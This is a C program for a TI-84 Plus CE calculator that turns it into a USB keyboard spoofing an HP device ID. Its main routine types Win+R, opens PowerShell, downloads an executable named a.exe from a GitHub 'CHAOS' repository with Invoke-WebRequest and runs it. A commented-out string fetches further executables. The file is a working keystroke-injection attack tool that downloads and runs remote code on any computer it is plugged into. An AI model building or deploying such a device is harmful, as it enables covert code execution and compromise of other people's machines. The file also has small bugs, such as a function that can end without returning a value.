#include <keypadc.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/timers.h>
#include <ti/getcsc.h>
#include <tice.h>
#include <time.h>
#include <usbdrvce.h>

#include "hid.h"
#include "usb_hid_keys.h"

#define DEFAULT_LANGID 0x0409

static const uint8_t map[] = {
    [sk_Up] = KEY_UP,         [sk_Down] = KEY_DOWN,   [sk_Left] = KEY_LEFT, [sk_Right] = KEY_RIGHT,
    [sk_Del] = KEY_BACKSPACE, [sk_Clear] = KEY_NONE,  [sk_Math] = KEY_A,    [sk_Apps] = KEY_B,
    [sk_Prgm] = KEY_C,        [sk_Recip] = KEY_D,     [sk_Sin] = KEY_E,     [sk_Cos] = KEY_F,
    [sk_Tan] = KEY_G,         [sk_Power] = KEY_H,     [sk_Square] = KEY_I,  [sk_Comma] = KEY_J,
    [sk_LParen] = KEY_K,      [sk_RParen] = KEY_L,    [sk_Div] = KEY_M,     [sk_Log] = KEY_N,
    [sk_7] = KEY_O,           [sk_8] = KEY_P,         [sk_9] = KEY_Q,       [sk_Mul] = KEY_R,
    [sk_Ln] = KEY_S,          [sk_4] = KEY_T,         [sk_5] = KEY_U,       [sk_6] = KEY_V,
    [sk_Sub] = KEY_W,         [sk_Store] = KEY_X,     [sk_1] = KEY_Y,       [sk_2] = KEY_Z,
    [sk_3] = KEY_CAPSLOCK,    [sk_Add] = KEY_DOT,     [sk_0] = KEY_SPACE,   [sk_DecPnt] = KEY_SEMICOLON,
    [sk_Chs] = KEY_SLASH,     [sk_Enter] = KEY_ENTER, [sk_Stat] = KEY_TAB,
};

static const uint8_t special_map[] = {
    [sk_Up] = KEY_VOLUMEUP,
    [sk_Down] = KEY_VOLUMEDOWN,
    [sk_Left] = KEY_MEDIA_BACK,
    [sk_Right] = KEY_MEDIA_FORWARD,
    [sk_Del] = KEY_BACKSPACE,
    [sk_Clear] = KEY_NONE,
    [sk_Math] = KEY_F1,
    [sk_Apps] = KEY_F2,
    [sk_Prgm] = KEY_F3,
    [sk_Recip] = KEY_F4,
    [sk_Sin] = KEY_F5,
    [sk_Cos] = KEY_F6,
    [sk_Tan] = KEY_F7,
    [sk_Power] = KEY_F8,
    [sk_Square] = KEY_HOME,
    [sk_Comma] = KEY_COMMA,
    [sk_LParen] = KEY_KPLEFTPAREN,
    [sk_RParen] = KEY_KPRIGHTPAREN,
    [sk_Div] = KEY_ESC,
    [sk_Log] = KEY_PAGEUP,
    [sk_7] = KEY_7,
    [sk_8] = KEY_8,
    [sk_9] = KEY_9,
    [sk_Mul] = KEY_KPASTERISK,
    [sk_Ln] = KEY_PAGEDOWN,
    [sk_4] = KEY_4,
    [sk_5] = KEY_5,
    [sk_6] = KEY_6,
    [sk_Sub] = KEY_MINUS,
    [sk_Store] = KEY_END,
    [sk_1] = KEY_1,
    [sk_2] = KEY_2,
    [sk_3] = KEY_3,
    [sk_Add] = KEY_EQUAL,
    [sk_0] = KEY_0,
    [sk_DecPnt] = KEY_SEMICOLON,
    [sk_Chs] = KEY_SLASH,
    [sk_Enter] = KEY_ENTER,
    [sk_Stat] = KEY_TAB,
    [sk_Vars] = KEY_LEFTMETA,
};

static const uint8_t keys[] = {
    sk_Math, sk_Apps, sk_Prgm, sk_Recip, sk_Sin, sk_Cos,    sk_Tan, sk_Power, sk_Square, sk_Comma, sk_LParen, sk_RParen,
    sk_Div,  sk_Log,  sk_7,    sk_8,     sk_9,   sk_Mul,    sk_Ln,  sk_4,     sk_5,      sk_6,     sk_Sub,    sk_Store,
    sk_1,    sk_2,    sk_3,    sk_Add,   sk_0,   sk_DecPnt, sk_Chs, sk_3,     sk_Mode,   sk_Enter, sk_Mode,   sk_1,
    sk_2,    sk_3,    sk_4,    sk_5,     sk_6,   sk_7,      sk_8,   sk_9,     sk_0};

static const char chars[] = "abcdefghijklmnopqrstuvwxyz|._;/^*EM1234567890";

static uint8_t convert(char ch) {
    for (int i = 0; i < 30; i++) {
        if (chars[i] == ch) {
            return keys[i];
        }
    }
}

// Adds keys to the 8-byte HID input_data
static uint8_t add_key(uint8_t key, uint8_t input_data[]) {
    // Toggle for normal/special characters
    static bool special_mode;

    // Sets the modifier bits in the first byte of input_data
    switch (key) {
    case sk_2nd:
        input_data[0] = input_data[0] | SHIFT_BIT;
        return 0;
    case sk_Alpha:
        input_data[0] = input_data[0] | CTRL_BIT;
        return 0;
    case sk_GraphVar:
        input_data[0] = input_data[0] | ALT_BIT;
        return 0;
    case sk_Vars:
        input_data[0] = input_data[0] | GUI_BIT;
        break; // Doesn't return because GUI key needs to be set as byte too
    case sk_Mode:
        special_mode = !special_mode;
        return 0;
    }

    // GSC key conversion to HID key
    uint8_t hid_key;
    if (!special_mode) {
        hid_key = key < sizeof(map) / sizeof(*map) ? map[key] : KEY_NONE;
    } else {
        hid_key = key < sizeof(special_map) / sizeof(*special_map) ? special_map[key] : KEY_NONE;
    }

    printf("K%d", hid_key);

    // Adds keys to last 6 bytes in input_data
    for (int i = 2; i <= 7; i++) {
        uint8_t prev_key = input_data[i];
        if (prev_key == KEY_NONE) {
            input_data[i] = hid_key;
            return 0;
        }
    }

    // No space in array left, send overflow packet
    // Happens when more than 6 keys are pressed at once
    return ROLLOVER_ERR;
}

static usb_device_t active_device;

static usb_error_t key_callback(usb_endpoint_t pEndpoint, usb_transfer_status_t status, size_t size, uint8_t state) {

    // Empty for the time being

    return USB_SUCCESS;
}

static usb_error_t handleUsbEvent(usb_event_t event, void *event_data, usb_callback_data_t *callback_data) {
    static const usb_control_setup_t check_idle_request = {
        .bmRequestType = USB_HOST_TO_DEVICE | USB_VENDOR_REQUEST | USB_RECIPIENT_INTERFACE, // 0x21
        .bRequest = 0x0a,                                                                   // Set idle
        .wValue = 0,
        .wIndex = 0,
        .wLength = 0,
    };

    static const hid_report_request_t check_hid_report_request = {
        .bmRequestType = 0x81, // USB_DEVICE_TO_HOST | USB_STANDARD_REQUEST | USB_RECIPIENT_INTERFACE,
        .bDescriptorIndex = 0x0,
        .bDescriptorType = 0x22, // HID report
        .wDescriptorLength = 63,
    };

    static const uint8_t hid_report_descriptor[63] = {
        5,     0x1,   // USAGE_PAGE (Generic Desktop)
        9,     0x6,   // USAGE (Keyboard)
        0x0A1, 0x1,   // COLLECTION (Application)
        0x5,   7,     //   USAGE_PAGE (Keyboard)
        0x19,  0x0E0, //   USAGE_MINIMUM (Keyboard LeftControl)
        0x29,  0x0E7, //   USAGE_MAXIMUM (Keyboard Right GUI)
        0x15,  0x0,   //   LOGICAL_MINIMUM (0)
        0x25,  0x1,   //   LOGICAL_MAXIMUM (1)
        0x75,  0x1,   //   REPORT_SIZE (1)
        0x95,  0x8,   //   REPORT_COUNT (8)
        0x81,  0x2,   //   INPUT (Data,Var,Abs)
        0x95,  0x1,   //   REPORT_COUNT (1)
        0x75,  0x8,   //   REPORT_SIZE (8)
        0x81,  0x3,   //   INPUT (Cnst,Var,Abs) 81 03
        0x95,  0x5,   //   REPORT_COUNT (5)
        0x75,  0x1,   //   REPORT_SIZE (1)
        0x5,   0x8,   //   USAGE_PAGE (LEDs)
        0x19,  0x1,   //   USAGE_MINIMUM (Num Lock)
        0x29,  0x5,   //   USAGE_MAXIMUM (Kana)
        0x91,  0x2,   //   OUTPUT (Data,Var,Abs)
        0x95,  0x1,   //   REPORT_COUNT (1)
        0x75,  0x3,   //   REPORT_SIZE (3)
        0x91,  0x3,   //   OUTPUT (Cnst,Var,Abs) 91 03
        0x95,  0x6,   //   REPORT_COUNT (6)
        0x75,  0x8,   //   REPORT_SIZE (8)
        0x15,  0x0,   //   LOGICAL_MINIMUM (0)
        0x25,  0x65,  //   LOGICAL_MAXIMUM (101)
        0x5,   0x7,   //   USAGE_PAGE (Keyboard)
        0x19,  0x0,   //   USAGE_MINIMUM (Reserved (no event indicated))
        0x29,  0x65,  //   USAGE_MAXIMUM (Keyboard Application)
        0x81,  0x0,   //   INPUT (Data,Ary,Abs)
        0x0C0         // END_COLLECTION
    };

    static const uint8_t hid_report_check[8] = {0x81, 0x6, 0x0, 0x22, 0x0, 0x0, 0x63};

    usb_error_t error = USB_SUCCESS;

    active_device = usb_FindDevice(NULL, NULL, USB_SKIP_HUBS);

    static const usb_control_setup_t transfer_setup = {
        .bmRequestType = 0,
        .bRequest = 0,
        .wValue = 0,
        .wIndex = 0,
        .wLength = 0,
    };

    switch ((unsigned)event) {
    case USB_DEFAULT_SETUP_EVENT: {
        const usb_control_setup_t *setup = event_data;
        const uint8_t *hid2 = event_data;
        const hid_report_request_t *hid = event_data;
        if (hid2[0] == 0x81) {
            printf("DEVICE:%02X ", active_device);

            error = usb_ScheduleTransfer(usb_GetDeviceEndpoint(active_device, 0), hid_report_descriptor, 63,
                                         key_callback, NULL);
            printf("REP_ERROR:%d ", error);
            error = USB_IGNORE;
        } else if (hid2[0] == 0x21) {
            error = usb_ScheduleTransfer(usb_GetDeviceEndpoint(active_device, 0), NULL, 0, NULL, NULL);
            printf("SET_ERROR:%d ", error);
            error = USB_IGNORE;
        }
    }
    }
    return error;
}

#include "keypress.h"
struct KeyPress toKeyPress(char in) {
    if (in >= 'a' && in <= 'z') {
        struct KeyPress out = {0, 0, KEY_A + in - 'a', 0, 0, 0, 0, 0};
        return out;
    } else if (in >= 'A' && in <= 'Z') {
        struct KeyPress out = {SHIFT_BIT, 0, KEY_A + in - 'A', 0, 0, 0, 0, 0};
        return out;
    } else if (in >= '1' && in <= '9') {
        struct KeyPress out = {0, 0, KEY_1 + in - '1', 0, 0, 0, 0, 0};
        return out;
    } else if (in == '0') {
        struct KeyPress out = {0, 0, KEY_0, 0, 0, 0, 0, 0};
        return out;
    }
    struct KeyPress out = {0, 0, 0, 0, 0, 0, 0, 0};
    switch (in) {
    case ' ':
        out.data[0] = 0;
        out.data[2] = KEY_SPACE;
        break;
    case '!':
        out.data[0] = SHIFT_BIT;
        out.data[2] = KEY_1;
        break;
    case '@':
        out.data[0] = SHIFT_BIT;
        out.data[2] = KEY_2;
        break;
    case '#':
        out.data[0] = SHIFT_BIT;
        out.data[2] = KEY_3;
        break;
    case '$':
        out.data[0] = SHIFT_BIT;
        out.data[2] = KEY_4;
        break;
    case '%':
        out.data[0] = SHIFT_BIT;
        out.data[2] = KEY_5;
        break;
    case '^':
        out.data[0] = SHIFT_BIT;
        out.data[2] = KEY_6;
        break;
    case '\"':
        out.data[0] = SHIFT_BIT;
        out.data[2] = KEY_APOSTROPHE;
        break;
    case '&':
        out.data[0] = SHIFT_BIT;
        out.data[2] = KEY_7;
        break;
    case '*':
        out.data[0] = SHIFT_BIT;
        out.data[2] = KEY_8;
        break;
    case '(':
        out.data[0] = SHIFT_BIT;
        out.data[2] = KEY_9;
        break;
    case ')':
        out.data[0] = SHIFT_BIT;
        out.data[2] = KEY_0;
        break;
    case ':':
        out.data[0] = SHIFT_BIT;
        out.data[2] = KEY_SEMICOLON;
        break;
    case '/':
        out.data[0] = 0;
        out.data[2] = KEY_SLASH;
        break;
    case '.':
        out.data[0] = 0;
        out.data[2] = KEY_DOT;
        break;
    case '-':
        out.data[0] = 0;
        out.data[2] = KEY_MINUS;
        break;
    case '_':
        out.data[0] = SHIFT_BIT;
        out.data[2] = KEY_MINUS;
        break;
    default:
        break;
    }
    return out;
}

int main(void) {
    static const usb_string_descriptor_t product_name = {
        .bLength = sizeof(product_name),
        .bDescriptorType = USB_STRING_DESCRIPTOR,
        .bString = L"Hello, World!",
    };

    static const usb_string_descriptor_t *strings[] = {&product_name};
    static const usb_string_descriptor_t langids = {
        .bLength = sizeof(langids),
        .bDescriptorType = USB_STRING_DESCRIPTOR,
        .bString =
            {
                [0] = DEFAULT_LANGID,
            },
    };
    static struct {
        usb_configuration_descriptor_t configuration;
        struct {
            usb_interface_descriptor_t interface;
            hid_descriptor_t hid;
            usb_endpoint_descriptor_t endpoints[1];
        } interface0;
    } configuration1 = {
        .configuration =
            {
                .bLength = sizeof(configuration1.configuration),
                .bDescriptorType = USB_CONFIGURATION_DESCRIPTOR,
                .wTotalLength = sizeof(configuration1),
                .bNumInterfaces = 1,
                .bConfigurationValue = 1,
                .iConfiguration = 0,
                // Must use remote wakeup
                // https://stackoverflow.com/questions/44337151/how-do-you-get-a-composite-usb-linux-device-with-hid-to-wake-up-a-suspended-host
                .bmAttributes = 0xa0, // USB_BUS_POWERED | USB_REMOTE_WAKEUP,
                .bMaxPower = 500 / 2,
            },
        .interface0 =
            {
                .interface =
                    {
                        .bLength = sizeof(configuration1.interface0.interface),
                        .bDescriptorType = USB_INTERFACE_DESCRIPTOR,
                        .bInterfaceNumber = 0,
                        .bAlternateSetting = 0,
                        .bNumEndpoints =
                            sizeof(configuration1.interface0.endpoints) / sizeof(*configuration1.interface0.endpoints),
                        .bInterfaceClass = USB_HID_CLASS,
                        .bInterfaceSubClass = 1,
                        .bInterfaceProtocol = 1,
                        .iInterface = 0,
                    },
                .hid =
                    {
                        .bLength = sizeof(configuration1.interface0.hid),
                        .bDescriptorType = 0x21, // HID descriptor type 0x21
                        .bcdHID = 0x0110,
                        .bCountryCode = 0,
                        .bNumDescriptors = 1,
                        .bDescriptorType2 = 34,
                        .wDescriptorLength = 63, // sizeof(hid_report_descriptor)
                    },
                .endpoints =
                    {
                        [0] =
                            {
                                .bLength = sizeof(configuration1.interface0.endpoints[0]),
                                .bDescriptorType = USB_ENDPOINT_DESCRIPTOR,
                                .bEndpointAddress = USB_DEVICE_TO_HOST | 1,
                                .bmAttributes = USB_INTERRUPT_TRANSFER,
                                .wMaxPacketSize = 0x0008,
                                .bInterval = 1,
                            },
                    },
            },
    };
    static const usb_configuration_descriptor_t *configurations[] = {
        &configuration1.configuration,
    };
    static const usb_device_descriptor_t device = {
        .bLength = sizeof(device),
        .bDescriptorType = USB_DEVICE_DESCRIPTOR, // 1
        .bcdUSB = 0x0200,
        .bDeviceClass = 0,
        .bDeviceSubClass = 0,
        .bDeviceProtocol = 0,
        .bMaxPacketSize0 = 0x40,
        .idVendor = 0x3f0, // HP, Inc
        .idProduct = 0x24, // KU-0316
        .bcdDevice = 0x0300,
        .iManufacturer = 0,
        .iProduct = 0,
        .iSerialNumber = 0,
        .bNumConfigurations = sizeof(configurations) / sizeof(*configurations),
    };
    static const usb_standard_descriptors_t standard = {
        .device = &device,
        .configurations = configurations,
        .langids = &langids,
        .numStrings = sizeof(strings) / sizeof(*strings),
        .strings = strings,
    };

    // This array will be populated with the HID input data
    static uint8_t blank_data[8] = {0, // Modifier key
                                    0, // Reserved
                                    0, // First input
                                    0, 0, 0, 0, 0};

    // const char data_input[] = "r\apowershell\e\a\a\aecho hello from the calculator!\e\e\a\a\aInvoke-WebRequest "
    //                           "https://github.com/Eugene109/CCDMinigame/raw/main/main.exe -OutFile
    //                           game.exe\e\e\e\a\a\a" "Invoke-WebRequest "
    //                           "https://github.com/314PiGuy/CHAOS/raw/main/a.exe -OutFile a.exe\e \e\e\e\a\a\a"
    //                           "Invoke-WebRequest "
    //                           "https://github.com/Eugene109/CCDMinigame/blob/main/"
    //                           "Pheonix_Holmes_Stationary.png?raw=true -OutFile a.exe\e          "
    //                           "                                                    "
    //                           "                                              ";
    const char data_input[] = "r\apowershell\e\a\a\a\aInvoke-WebRequest"
                              " https://github.com/314PiGuy/CHAOS/raw/main/a.exe -OutFile a.exe\e          \e\e\e\a\a\a"
                              "./a.exe\e                                       "
                              "                                                                            "
                              "                                              ";
    const int A_HOLD_ITERS = 50;

    struct KeyPress commands[sizeof(data_input)] = {0};
    for (int a = 0; a < (int)sizeof(data_input); a++) {
        if (data_input[a] == '\e') {
            commands[a].data[2] = KEY_ENTER;
        } else if (data_input[a] == '\a') {
            commands[a].data[1] = 69;
        } else {
            commands[a] = toKeyPress(data_input[a]);
        }
    }
    commands[0].data[0] = GUI_BIT; // windows-r for run commmand
    usb_error_t error;
    if ((error = usb_Init(handleUsbEvent, NULL, &standard, USB_DEFAULT_INIT_FLAGS)) == USB_SUCCESS) {
        printf("Success!\n");

        int i = -1;
        int repeat = -1;
        while (i < (int)sizeof(data_input)) {
            usb_HandleEvents();
            kb_Scan();

            // Clear input array
            // memset(&blank_data, KEY_NONE, 8);

            if (kb_Data[6] & kb_Clear) {
                break;
            }
            if (os_GetCSC()) {
                i = 0;
            }
            if (i >= 0) {
                // if (data_input[i] == '\0') {
                //     msleep(10);
                //     error = (usb_error_t)usb_ScheduleInterruptTransfer(usb_GetDeviceEndpoint(active_device, 0x81),
                //                                                        &(blank_data), 8, key_callback, NULL);
                //     msleep(10);
                //     error = (usb_error_t)usb_ScheduleInterruptTransfer(usb_GetDeviceEndpoint(active_device, 0x81),
                //                                                        &(blank_data), 8, key_callback, NULL);
                //     break;
                // }
                // Send input data to host
                if (commands[i].data[1] == 69) {
                    if (repeat == 0) {
                        repeat = -1;
                        i++;
                        continue;
                    }
                    if (repeat == -1) {
                        repeat = A_HOLD_ITERS;
                    }
                    repeat--;
                    continue;

                } else {
                    // printf("i: %d", i);
                    error = (usb_error_t)usb_ScheduleInterruptTransfer(usb_GetDeviceEndpoint(active_device, 0x81),
                                                                       (commands[i].data), 8, key_callback, NULL);
                    msleep(10);
                    error = (usb_error_t)usb_ScheduleInterruptTransfer(usb_GetDeviceEndpoint(active_device, 0x81),
                                                                       &(blank_data), 8, key_callback, NULL);
                    i++;
                }
                msleep(20);
            }
        }

        // Exit program and display final error code
        usb_Cleanup();
        printf("error: %d", error);
        os_GetKey();
    }
}